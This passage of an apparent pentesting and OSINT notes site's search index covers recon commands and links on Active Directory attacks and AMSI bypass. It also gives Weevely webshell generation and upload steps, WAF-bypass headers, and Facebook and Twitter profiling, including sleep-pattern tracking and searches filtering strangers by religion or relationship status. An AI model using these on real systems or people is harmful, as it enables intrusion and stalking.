ForwardDNS dataset is a part of Project Sonar # This dataset is created by extracting domain names from a number of sources and then sending an ANY query for each domain # You can download the dataset and parse it but IT\u0026#39;S HUGE (20Gb compressed, 300+ Gb uncompressed) # It seems to be the best solution to find subdomains curl -silent https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz | pigz -dc | grep “.icann.org” | jq wget https://opendata.rapid7.com/sonar.fdns_v2/2019-11-29-1574985929-fdns_a.json.gz cat 20170417-fdns.json.gz | pigz -dc | grep \u0026#34;.target.org\u0026#34; | jq# SonarSearch is a project built arond the Rapid7 Sonar\u0026#39;s database https://github.com/Cgboal/SonarSearch # An API instance is available at https://omnisint.io/ # Crobat is a CLI tool designed to query this API $ crobat -h Usage of crobat: -r string Perform reverse lookup on IP address or CIDR range. Supports files and quoted lists -s string Get subdomains for this value. Supports files and quoted lists -t string Get tlds for this value. Supports files and quoted lists -u Ensures results are unique, may cause instability on large queries due to RAM requirements \nASN/Burp example # Get ASN for your target bgp.he.net # Then you a use amass to find top level domains amass intel -active -asn 361XXXX # Then look on crunchbase for acquisitions # Link discovery in Burp # BurpSuite History too # Set target, go on the main website, then look for requests made to different domains # Select all and send them to spider --\u0026gt; Discover new ones # Doing it from a VPN can be better to avoid IP ban # Reverse whois / By owner # Test HTTP for subdomains # To get domain running webservers cat subdomains_list | httprobe # Using aquatone to get screenshots of discovered sites cat subdomains_servers | aquatone # OpenList Firefox extension can help to visualize websites # Content Discovery # Ffuf is one of the fastest web fuzzer but not recursive # Dirsearch is good for recursive https://github.com/ffuf/ffuf ffuf -u site/FUZZ -w wordlist ffuf -u site/FUZZ/HERE -w wordlist"
},
{
	"uri": "/resources/systems/",
	"title": "Systems",
	"tags": [],
	"description": "",
	"content": " Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) Hunting for Skeleton Key implants (https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/) Hunting for Impacket (https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) Kerberoasting without SPNs (https://swarm.ptsecurity.com/kerberoasting-without-spns/)  Privilege Escalation  PrivExchange (https://github.com/dirkjanm/PrivExchange) Abusing Exchange (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) Exploiting PrivExchange (https://chryzsh.github.io/exploiting-privexchange/)\n LOLBAS (https://lolbas-project.github.io/#)\n Windows EoP Cheatsheet (https://guif.re/windowseop)\n Windows Privilege Escalation (https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html)\n Abusing Active Directory Permissions with PowerView (http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)\n DCSync: Dump Password Hashes from Domain Controller (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)\n Unconstrained Delegations (https://johnkol.com/unconstrained-delegation/)\n No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA (http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)\n Invoke-Recon (https://github.com/phackt/Invoke-Recon)\n Dumping credentials (offline) (https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/)\n  Evasion  AMSI Bypass Methods and tools (https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/) AMSI.fail (https://amsi.fail/) Resurecting an old AMSI Bypass (https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/) AMSI Bypass (https://www.contextis.com/us/blog/amsi-bypass) Getting Rastamouse’s AmsiScanBufferBypass to Work Again (https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/)  Others  Virtual/Remote Environments Breakout (https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/) WriteUp LeHack19 Akerva (https://github.com/aas-n/leHACK19) A view of persistence (https://rastamouse.me/2018/03/a-view-of-persistence/) AD Security Attack Defense (https://github.com/infosecn1nja/AD-Attack-Defense) Active Directory Enumeration with AD Module without RSAT or Admin Privileges (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges) AMSI - Resurecting the Dead (https://crawl3r.github.io/2020-05-22/AMSI_Resurrecting_the_dead) Over-Pass-The-Hash (http://inf0sec.fr/article-17.php) SigThief (https://github.com/secretsquirrel/SigThief) AD Pentesting mindmap (https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png) MS Exchange Server pentesting mindmap (https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) WADComs interactive Cheatsheet (https://wadcoms.github.io/) Windows \u0026amp; AD Exploitation Cheat Sheet and Command Reference (https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/) Attacking Active Directory (https://zer1t0.gitlab.io/posts/attacking_ad/)    Linux Privilege Escalation  Basic Linux Privilege Escalation (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) Restricted Linux Shell Escaping Techniques (https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/) GTFO Bins (https://gtfobins.github.io/)\n Privilege Escalation Cheatsheet for OSCP (Vulnhub) (https://github.com/Ignitetechnologies/Privilege-Escalation#kernel)\n  Others  TMUX Cheatsheet (https://gist.github.com/MohamedAlaa/2961058) Blocky, un proxy DNS pour votre nunux (https://lord.re/posts/204-profiter-de-dns-over-httpstls-sur-linux/)    FreeIPA  Attacking FreeIPA Part 1 (https://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a) Attacking FreeIPA Part 2 (https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1)    AWS  My arsenal of AWS Security Tools (https://github.com/toniblyx/my-arsenal-of-aws-security-tools) AWS Cheatsheet (https://www.magnussen.funcmylife.fr/article_35)  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/",
	"title": "Technical Investigation",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/twitter/",
	"title": "Twitter",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks Geolocation # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com Downloader # Twitter video downloader https://twdown.net/ Account Analysis # Tweeter account analysis (account needed) https://tweetreach.com/ # When was created an account http://twbirthday.com/haaxmax/ # Sleeping time (account needed) http://sleepingtime.org/ # Simple analysis/analytics https://socialbearing.com/search/general/sodifrance https://foller.me # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ # Tool to see what some accounts have in common https://tweepdiff.com/ # Another account analysis service https://accountanalysis.app/ Data visualization # Free tool to build graph and visualize the spread of claims and fact checking https://hoaxy.iuni.iu.edu/ Tracking Accounts \u0026amp; Modifications # With spoonbill, you can check and record people accounts modification # It checks accounts of people you\u0026#39;re following https://spoonbill.io/ # Find stalker (checks who\u0026#39;s following and who\u0026#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who\u0026#39;s following x+x or who y+y follows http://twiangulate.com https://doesfollow.com/ \nExport and Archive # Export and Archive Threads # https://jakecreps.com/2020/04/10/threadreaderapp-osint-archive-twitter/amp/ # This twitter bot allows to archive content https://twitter.com/threadreaderapp @threadreaderapp unroll # Method 2 # You can also use the service engine to look for persons or threads # It can capture deleted content https://threadreaderapp.com/ https://threadreaderapp.com/user/fs0c131y # Method 3 # Twitter Advanded Search # \u0026#34;@threadreaderapp unroll\u0026#34; # You can directly download videos from the archived content # Cannot directly from Twitter # You can use Wayback Machine to archive the archive ;) # In the case they choose the remove it \nTweet Analyzer (https://github.com/x0rz/tweets_analyzer) # The goal of this simple python script is to analyze a Twitter profile through its tweets by detecting: # Average tweet activity, by hour and by day of the week # Timezone and language set for the Twitter interface # Sources used (mobile application, web browser, ...) # Geolocations # Most used hashtags, most retweeted users and most mentioned users # Friends analysis based on most frequent timezones/languages # Basic python tweets_analyzer.py -n \u0026lt;@username\u0026gt; \nTwitter Intelligence (https://github.com/batuhaniskr/twitter-intelligence) # Another tool used to analyze twitter accounts # SQLite database is used # Search by username python3 tracking.py --username \u0026#34;HaberSau\u0026#34; # Search by query python3 tracking.py --query \u0026#34;sakarya\u0026#34; # Search in a time range python3 tracking.py --username \u0026#34;HaberSau\u0026#34; --since 2015-09-10 --until 2015-09-12 --maxtweets 10 # Get location (slower) python3 tracking.py --query \u0026#34;sakarya\u0026#34; --location \u0026#34;True\u0026#34; # Location analysis (you need to get Google API Key in settings.py) python3 analysis py --location \nTwitter Back From The Death # This tool checks an user account history to get tweets # It then parses tweets to extract all URL links and then # Checks if the domain is available for registration https://github.com/misterch0c/twitterBFTD \nTwint https://github.com/twintproject/twint"
},
{
	"uri": "/web-pentest/applicative-scans/vhost/",
	"title": "VHOST Scanning",
	"tags": [],
	"description": "",
	"content": " Virtual Host Scanner # Basic HTTP Scanner that\u0026#39;ll enumerate virtual hosts on a given IP # It may reveal hidden hosts # Docker ? ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Options --ignore-http-codes --ignore-content-length --port --- If running on another port --wordlist --- specify an alternative location for the wordlist file --ssl --- on/off depending if you want to connect to HTTP --output --- output file"
},
{
	"uri": "/shells-methods/webshell/",
	"title": "Webshell",
	"tags": [],
	"description": "",
	"content": " Weevely # Weevely is insane ! # It\u0026#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate \u0026lt;password\u0026gt; \u0026lt;filename\u0026gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely \u0026lt;url\u0026gt; \u0026lt;password"
},
{
	"uri": "/web-pentest/tools/ffuf/",
	"title": "ffuf",
	"tags": [],
	"description": "",
	"content": " Resources / Notes # A fast web fuzzer written in Go. https://github.com/ffuf/ffuf Typical commands \u0026amp; Usage # Directory discovery ffuf -w /path/to/wordlist -u https://target/FUZZ # Adding classical header (some WAF bypass) ffuf -c -w \u0026#34;/opt/host/main.txt:FILE\u0026#34; -H \u0026#34;X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1\u0026#34; -fs 5682,0 -u https://target/FUZZ # match all responses but filter out those with content-size 42 ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz Host-header, match HTTP 200 responses. ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Virtual host discovery (without DNS records) ffuf -w /path/to/vhost/wordlist -u https://target -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Playing with threads and wait ./ffuf -u https://target/FUZZ -w /home/mdayber/Documents/Tools/Wordlists/WebContent_Discovery/content_discovery_4500.txt -c -p 0.1 -t 10 # GET param fuzzing, filtering for invalid response size (or whatever) ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242 # GET parameter fuzzing if the param is known (fuzzing values) and filtering 401 ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401 # POST parameter fuzzing ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target/login.php -fc 401 # Fuzz POST JSON data. Match all responses not containing text \u0026#34;error\u0026#34;. ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\  -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34;"
},
{
	"uri": "/network/services-enumeration/53_dns/",
	"title": "53 - DNS",
	"tags": [],
	"description": "",
	"content": " Zone Transfer # Port scan and trying zone transfer nmap --script=dns-transfer-zone -p 53 domain # DNS Zone Transfer using dig dig axfr @IP guess_domain_name \nActive Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global Catalog dig -t SRV _gc._tcp.lab.ropnop.com # LDAP servers dig -t SRV _ldap._tcp.lab.ropnop.com # Kerberos KDC dig -t SRV _kerberos._tcp.lab.ropnop.com # Kerberos password change server dig -t SRV _kpasswd._tcp.lab.ropnop.com nmap --script dns-srv-enum --script-args “dns-srv-enum.domain=\u0026#39;lab.ropnop.com\u0026#39;”"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/buscador/",
	"title": "Buscador",
	"tags": [],
	"description": "",
	"content": " Tools Custom Firefox Browser \u0026amp; Add-Ons Custom Chrome Browser \u0026amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego\tMetagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities \nTools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application. # GIMP → Image manipulation tool # Google Earth Pro → Advanced Google Earth → Browse and create maps # HTTrack Cloner → Copy website locally → It downloads website content and rebuild the file structure # InstaLooter → API-less Instagram pictures and videos downloader # KeePassXC → Keepass Cross Platform Community Edition # Kleopatra → Kleopatra is a certificate manager and GUI for GnuPG # Knock Pages → Subdomain bruteforce → Virustotal, wildcard, zone transfer → Using a wordlist # LibreOffice → Known one # LinkedInt → LinkedIn Intelligence → Find emails, companies etc # Maltego → # Metagoofil → Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # MediaInfo → Complete tool used to get information about local files → Metada etc # Metadata anonymisation Toolkit → Small tool used to anonymise file\\\u0026#39;s metadata # PhoneInfoga → Information gathering \u0026amp; OSINT reconnaissance tool for phone numbers → Scan phone numbers using only free resources → The goal is to first gather standard information such as country, area, carrier and line type on any international phone numbers → Then search for footprints on search engines to try to find the VoIP provider or identify the owner → Features ⇒ Check if phone number exists and is possible ⇒ Gather standard informations such as country, line type and carrier ⇒ OSINT footprinting using external APIs, Google Hacking, phone books \u0026amp; search engines ⇒ Check for reputation reports, social media, disposable numbers and more ⇒ Scan several numbers at once ⇒ Use custom formatting for more effective OSINT reconnaissance ⇒ Automatic footprinting on several custom formats # Photon → Photon is a fast OSINT web crawler which can retrieve the following data for a target : → URLs (in-scope \u0026amp; out-of-scope) → URLs with parameters (example.com/gallery.php?id=2) → Intel (emails, social media accounts, amazon buckets etc.) → Files (pdf, png, xml etc.) → Secret keys (auth/API keys \u0026amp; hashes) → JavaScript files \u0026amp; Endpoints present in them → Strings matching custom regex pattern → Subdomains \u0026amp; DNS related data # ReconDog → Recon Dog is an all in one tool for all your basic information gathering needs. → It uses APIs to gather all the information so your identity is not exposed. → Simple and basic standalone python script → All informations seems to be extracted from API\\\u0026#39;s services, so it fully passive # Recon-NG → Complete Framework → Reconnaissance → Usage of open sources (passive) → Discovery → More active, packets sent to target # SkipTracer → It uses some basic python webscraping to compile passive information on a target → Included modules will allow queries for the following : ⇒ Phone ⇒ Email ⇒ Screen names ⇒ Real names ⇒ Addresses ⇒ IP ⇒ Hostname ⇒ Breach Credentials # SocialMapper # Spiderfoot → Query over 100 OSINT sources (IP, domain names, email, names and more) → Select the target, pick modules and spiderfoot will collect and build links → You can identify data leaks, vulnerabilities or sensitive information → Windows and Linux # StegoSuite → Free and open source steganography tool written in Java. → With Stegosuite you can easily hide information in image files. # SubBrute → A DNS meta-query spider that enumerates DNS records, and subdomains. → Subdomain bruteforce # Sublist3r → Subdomain enumeration and BF → Great tool # theHarvester → theHarvester is a famous OSINT and scrapping tool for passiv recon on targets → Using API keys will highly increase results # Tinfoleak → The most complete open-source tool for Twitter intelligence analysis → UI tool # Twint → An advanced Twitter scraping \u0026amp; OSINT tool written in Python that doesn\\\u0026#39;t use Twitter\\\u0026#39;s API → Allowing you to scrape a user\\\u0026#39;s followers, following, Tweets and more while evading most API limitations. → Not rate limitations → Creates dashboard Twitter Exporter → ??? VeraCrypt → Known one, encryption VLC → Known one, video Yubico Utilities → tools for using yubikeys"
},
{
	"uri": "/open-source-intelligence-osint/company_investigations/",
	"title": "Company Investigations",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/other-systems/docker_stuff/",
	"title": "Docker Stuff",
	"tags": [],
	"description": "",
	"content": " Basics - Tips # Get a shell within the container docker ps sudo docker exec -u 0 -it \u0026lt;id_container\u0026gt; bash # Investigating container # --no-trunc option allow to have full output sudo docker history cont/ainer --no-trunc # Getting the container filesystem from the host # Then chmod and extract it # It can be usefull if some files have been deleted sudo docker save cont/ainer -o container.tar"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/facebook/",
	"title": "Facebook",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com https://lookup-id.com/ # Facebook tool for multi searches https://whopostedwhat.com/ # You can search for Facebook videos indexed on Google \u0026#34;topic\u0026#34; site:facebok.com!/*/videos # Source + script to do that https://twitter.com/lorenzoromani/status/1301843624230035456?s=19 https://github.com/lorenzoromani1983/facebookTranscripts/blob/master/facebookTranscripts.py # DumpItBlue Extension # Facebook tool box https://le-tools.com/DumpItBlueExtensionDoc.html \nFacebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE # You can search for car using plate number # For example ST-597-NS will give you car photos identified with relating plate number # You can search by text on Google for indexed videos Example: \u0026#34;hacking\u0026#34; site:http://facebook.com/*/videos. # You can also search for unique identifier # Even if they\u0026#39;re not tagued https://twitter.com/quiztime/status/1339544098529832969 \nFacebook Sleep Stats # A small tool to show the potential privacy implications modern social media have. # By tracking online/offline status of people on Facebook, it is possible to get an accurate image of their sleep pattern. https://github.com/sqren/fb-sleep-stats # Two process are running simultaniously : scrapper and webserver # Scraping npm run scrape # Server (localhost:3000) npm start # Ad blocker must be disabled # When the scrapper is off, it stops tracking \nUltimate Facebook Scraper # Python automated script used to scrape and parse data from a Facebook account # You need to provide your credentials (dedicated account) and targets as input in \u0026#34;input.txt\u0026#34;. # Limits : # - If the profile target is configured and not in your friends, you may see nothing # - If you request too much profiles, Facebook can block requests, resulting in crash # - If target profiles are big, can be very long an resources hungry # Results are stored in txt format, easily grepable by dates for examples. \nFacebook Graph Search # Graph Search is a Facebook internal search engine used to get precise results when searching # Facebook need to be in English version to activate the Graph Search # On June 2019, Facebook shut down its Graph Search options. # The ‘new’ Graph Search seems a little comprehensive at first # but it’s pretty easy once you get the hang of it. It involves some JSON and Base64. The New Graph Search Methods # Resources https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-1/ https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-2/ # Tools https://graph.tips/beta/ https://intelx.io/tools?tab=facebook# Identifiers are always required to performs queries # CTRL+U on page, profile, group... # CTFL+F # \u0026#34;entity_id\u0026#34; = Profile # \u0026#34;page_id\u0026#34; = Page # \u0026#34;group_id\u0026#34; = Group # EVERY Facebook requests start like this facebook.com/search/top/?q=people\u0026amp;epa=FILTERS\u0026amp;filters= # top/ Search top content # posts/ Search public posts # people/ Search for people # photos/ Search for photos # videos/ Search for videos # pages/ Search for pages # places/ Search for places # And then the content of the query facebook.com/search/posts/?q=baseball\u0026amp;epa=FILTERS\u0026amp;filters= # It uses then JSON and BASE64 to apply filters # For example, the JSON string for \u0026#34;most recent\u0026#34; is {“rp_chrono_sort”:”{\\”name\\”:\\”chronosort\\”,\\”args\\”:\\”\\”}”} # Then base64 encode it facebook.com/search/posts/?q=baseball\u0026amp;epa=FILTERS\u0026amp;filters=\u0026lt;BASE64\u0026gt; # You can also perform combined queries # Example : From one city and one employer {“city”:”{\\”name\\”:\\”users_location\\”,\\”args\\”:\\”108212625870265\\”}”} {“employer”:”{\\”name\\”:\\”users_employer\\”,\\”args\\”:\\”104958162837\\”}”} # Result {“city”:”{\\”name\\”:\\”users_location\\”,\\”args\\”:\\”108212625870265\\”}”,”employer”:”{\\”name\\”:\\”users_employer\\”,\\”args\\”:\\”104958162837\\”}”} # Think about testing queries https://jsonformatter.curiousconcept.com/ # And then concat with a classic query facebook.com/search/posts/?q=baseball\u0026amp;epa=FILTERS\u0026amp;filters=\u0026lt;BASE64\u0026gt; # Some queries # Most recent populair content {“rp_chrono_sort”:”{\\”name\\”:\\”chronosort\\”,\\”args\\”:\\”\\”}”} # Most populair public content {“rp_author”:”{\\”name\\”:\\”merged_public_posts\\”,\\”args\\”:\\”\\”}”} # Most populair content viewed by your profile {“interacted_posts”:”{\\”name\\”:\\”interacted_posts\\”,\\”args\\”:\\”\\”}”} # Posts from your friends {“rp_author”:”{\\”name\\”:\\”author_friends_feed\\”,\\”args\\”:\\”\\”}”} # Posts from the pages you like and the groups you are a member of {“rp_author”:”{\\”name\\”:\\”my_groups_and_pages_posts\\”,\\”args\\”:\\”\\”}”} # People who work at a specific employer {“employer”:”{\\”name\\”:\\”users_employer\\”,\\”args\\”:\\”PutIDHere\\”}”} # Photos viewed by your profile {“interacted_posts”:”{\\”name\\”:\\”interacted_posts\\”,\\”args\\”:\\”\\”}”} # Photos posted by your friends {“rp_author”:”{\\”name\\”:\\”author_friends_feed\\”,\\”args\\”:\\”\\”}”} Old Graph Search # Classic requests are like in natural language Photos of my friends # But some requests give bad results or false positive # Alternative is using the Graph Search through the URL facebook.com/search/str/\u0026lt;search\u0026gt;# Track you Facebook activity My favorites pages My favorites music Books I like Photos I have liked Photos have I like that are recent Places visited by me Places nearby I visited Games I like ...# View photos of friends or even strangers Photos of my friends Photos of my friends of friends taken in \u0026lt;Place\u0026gt; Photos of people named [Name] Photos of (or uploaded by) [Name] Photos of [Name] in (or before or after) [Year] Photos commented on by [Name] Photos liked by [Name] Photos of [Person A] liked by [Person B] Photos of [Person A] AND [Person B] photos taken in Paris, France from 2018 photos taken by phone xperia U Photos of friends of my friends photos of wedding uploaded by friends of my friends photos of graduation uploaded by friends of my friends photos of single friends of my friends uploaded by friends of my friends# Find new places Restaurants nearby liked by my friends [Cuisine] Restaurants liked by my friends of friends in [City] Hotels nearby liked by my friends of friends Friends who live (or have lived) in [Place] Recent photos taken in [Place] Places in [City] visited by people who live nearby# Know your followers People who follow me People who follow me and like [Page Name] People who follow me and live in [City] People who follow me and work at [Company] People who follow me and were born in [Year] Friends of friends who follow me# Find someone People who work nearby People who are [Profession Name] (like Doctors, Programmers, etc.) People who live in [Place] People who are named [Full or Partial Name] People who are [Gender] and live in [City] and [Relationship Status] People who believe in [Religion Name] People who are N years old People who are older than X and younger than Y years People who were born in [Year] People who work at [Company A] and previously worked at [Company B] People who live in Paris People who went to Harvard University friends of my friends friends of my friends who are single friends of my friends who are men interested in men people who live in new york city who uploaded photos taken in versailles# But some requests give bad results or false positive # Alternative is using the Graph Search through the URL facebook.com/search/str/\u0026lt;search\u0026gt; # If there are several searchs you can use AND / OR parameters xxx/intersect xxx/union facebook.com/search/str/\u0026lt;search\u0026gt;/str/secondone/intersect # People who live in Paris (present and past) www.facebook.com/search/str/paris/pages-named/residents/present/ www.facebook.com/search/str/paris/pages-named/residents/past/ # People who live in Ile de France now or in France (code) www.facebook.com/search/str/ile-de-france/pages-named/residents/present/ www.facebook.com/search/str/105604449474183/residents/present/ # Intersect one # People \u0026#34;Patrick\u0026#34; who live in Toulouse now www.facebook.com/search/str/patrick/users-named/str/toulouse/pages-named/residents/present/intersect/ # People \u0026#34;Patrick\u0026#34; who live in Toulouse now and Paris in the past www.facebook.com/search/str/patrick/users-named/str/toulouse/pages-named/residents/present/str/paris/pages-named/residents/past/intersect/ # People who live in Paris and who like the page \u0026#34;afis sciences et pseudo sciences\u0026#34; www.facebook.com/search/str/afis%20-%20science%20et%20pseudo-sciences/pages-named/likers/str/paris/pages-named/residents/present/intersect/ # Photos containing the keyword \u0026#34;humour\u0026#34; www.facebook.com/search/str/humour/photos-keyword/ # People \u0026#34;Jeanne\u0026#34; friends of people \u0026#34;Louise\u0026#34; www.facebook.com/search/str/jeanne/users-named/friends/str/louise/users-named/intersect/ # People who live in Geneva, who like Patrick Bruel\u0026#39;s page and Céline Dion\u0026#39;s page www.facebook.com/search/str/geneva/pages-named/residents/present/str/c%C3%A9line%20dion/pages-named/likers/str/patrick%20bruel/pages-named/likers/intersect/ # Searching the keyword \u0026#34;scientifique\u0026#34; posted last month /www.facebook.com/search/str/scientifique/stories-keyword/last-month/date/stories/intersect/ # Searching someone in Ile de France / France who posted the keyword \u0026#34;scientifique\u0026#34; last month www.facebook.com/search/str/ile-de-france/pages-named/residents/present/stories/str/scientifique/stories-keyword/stories/intersect/ www.facebook.com/search/str/105604449474183/pages-named/residents/present/stories/str/scientifique/stories-keyword/stories/intersect/ # Searching posts containing \u0026#34;foutaises\u0026#34; or \u0026#34;conneries\u0026#34; www.facebook.com/search/str/foutaises/stories-keyword/str/conneries/stories-keyword/union/ # Photos posted by French people www.facebook.com/search/str/105604449474183/residents/present/photos/ # People under 29 who live in Toulouse www.facebook.com/search/str/toulouse/pages-named/residents/present/29/users-older/intersect/"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/",
	"title": "Frameworks",
	"tags": [],
	"description": "",
	"content": " General thoughts about each framework or multitask tool    Tool Fully Passive Can be fully passive Individual commands Fully automated Thoughts Really Usable ?     Danger Zone Yes Yes No (not really) Almost Semi-Complete tool performing OSINT on 3 types of targets (domain, IP, email). Each type will then launch a bunch of tools and test to gather information Yes. It\u0026rsquo;s not fully exhaustive but can give some interesting informations   Gasmask Yes Yes Yes No Seems to be a complete tool but hard to use/learn. The command lien syntax looks hards Yes but need some practice to learn the syntax   Spiderfoot Not sure Probably not Not really but scans can be customised Yes Big and complete tool but it can bring many false positive. You still can analyse manually results. Scan are long (45min/1h) Yes but it can be hard sometimes   Datasploit No (wapp) Semi-Passive (browser like) No Almost Semi-complete and semi-passive tool. It will detect if IP, domain, username or phonenumber and perform some queries. You can specify quiet or active mode. Not totally passive, it acts like a web browser Probably yes. You can have good result but its not fully passive.   Recon-ng No Yes Yes (modules) No Big and complete tool but hard to use as long as you need to know modules Yes but need some practice to master modules   Omnibus No Yes Yes No Complete framework used to do many recon things. Individual commands so analysis can be fully passive. Features vocabulary is strange and need adapt Yes but need some practice to learn using session, modules etc   ReconDog Yes Yes No Yes Simple and basic recon, it only uses public API to gather informations Yes but informations won\u0026rsquo;t be enough   OSINT-SPY No Yes Yes No Simple tool, not veru exhaustive but can gather some informations about a target. Some functionnalties may be useless and some are buggy Hard to use as long as some outputs are broken and some features are basic (manually doable) or useless   Belati No No No Yes Automated script that does lots of manually doable things. Basic recon and not so passive. Not really. Benefits are not that good and it\u0026rsquo;s considered as active recon    \nTroubles / Nope Maltego (https://www.paterva.com/web7/downloads.php) → Still not installed → Wait and see Sn0int (https://sn0int.readthedocs.io/en/latest/index.html) → Install failed → module “nude” Intrigue-core (https://github.com/intrigueio/intrigue-core) → Not installed → Installation seemed hard compared to benefits PownRecon (https://github.com/pownjs/pown-recon) → NodeJS tool → Seemed to be focused on relations between people, not very efficient Inquisitor (https://github.com/penafieljlm/inquisitor) → Not installed → Not very efficient features"
},
{
	"uri": "/network/icmp/",
	"title": "ICMP Tricks",
	"tags": [],
	"description": "",
